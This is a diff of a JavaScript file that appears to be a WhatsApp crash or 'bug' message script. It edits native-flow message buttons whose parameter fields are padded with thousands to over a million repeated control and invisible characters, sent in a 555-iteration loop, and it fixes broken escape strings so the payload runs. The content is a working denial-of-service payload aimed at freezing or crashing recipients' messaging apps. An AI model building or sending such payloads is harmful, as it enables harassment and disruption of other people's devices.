@@ -1889,12 +1889,12 @@ for (let i = 0; i < 555; i++) {
             nativeFlowMessage: {  
               buttons: [  
                 { name: "view_product", buttonParamsJson: "\x10".repeat(5000) + salsa },  
-                { name: "address_message", buttonParamsJson: "\x20".repeat(5000) + salsa },  
-                { name: "galaxy_message", buttonParamsJson: "\10".repeat(6000) + salsa },  
+                { name: "address_message", buttonParamsJson: "\x21".repeat(5000) + salsa },  
+                { name: "galaxy_message", buttonParamsJson: "\x10".repeat(6000) + salsa },  
                 { name: "cta_url", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                 { name: "call_permission_request", buttonParamsJson: "\x10".repeat(1065000) + salsa },  
-                { name: "single_select", buttonParamsJson: "\x!".repeat(5000) + salsa },  
-                { name: "cta_copy", buttonParamsJson: "\.!.\x.10".repeat(4000) + salsa }  
+                { name: "single_select", buttonParamsJson: "\u2063".repeat(5000) + salsa },  
+                { name: "cta_copy", buttonParamsJson: "\u2063".repeat(4000) + salsa }  
               ],  
               nativeFlowResponseMessage: {  
                 name: "galaxy_message",  
